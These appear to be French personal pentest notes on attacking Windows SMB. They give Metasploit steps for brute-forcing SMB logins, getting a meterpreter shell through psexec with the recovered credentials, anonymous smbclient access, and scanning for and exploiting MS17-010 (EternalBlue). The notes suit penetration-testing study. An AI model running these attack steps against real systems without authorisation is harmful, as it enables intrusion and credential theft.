
# SMB

---

## PSEXEC avec Metasploit

* Scan classique avec `-script=smb-protocols` permet de voir les différents protocoles supportés par le serveur.  
* Lancer Metasploit  
* ``auxiliary/scanner/smb/smb_login`` et renseigner les options, pour brute forcer les users/passwords.  
* Une fois user/password récupérés, nous pouvons exécuter `exploit/windows/smb/psexec` et renseigner les bonnes infos (cible, user, password.) puis on lance l'exploit  
* On obtient ensuite un meterpreter. ( `shell`...)  
  

## SMBCLIENT 
Se connecter à un SMB client qui autorise la connection anonyme sans mot de passe.    
* `smbclient //IP_TARGET/MY_SHARE`
`-N` si pas de mot de passe  
* `smbclient //SERVEUR/PARTAGE -U utilisateur` il nous demandera le mot de passe.  
* `smbclient //SERVEUR/PARTAGE -U utilisateur%motdepasse`
* `smbclient -L //SERVEUR -U utilisateur` Pour lister les partages grâce `-L`.  



## Exploitation de la vulnérabilité SMB Windows MS17-010 (EternalBlue)
* On peut notamment exploiter le protocole SMBv1:  
Ex : `nmap -sV -p 445 --script=smb-vuln-ms17-010 -O 10.10.10.12` permet de scanner l'IP indiquée sur le port 445 avec la version du service et l'OS et de savoir si la cible est vulnérable à EternalBlue.  

* `exploit/windows/smb/ms17_010_eternalblue` : Renseigner les paramètres (LOHST, LPORT, RHOSTS). Puis `run`  
Si l'exploit fonctionne, nous obtenons un meterpreter.  
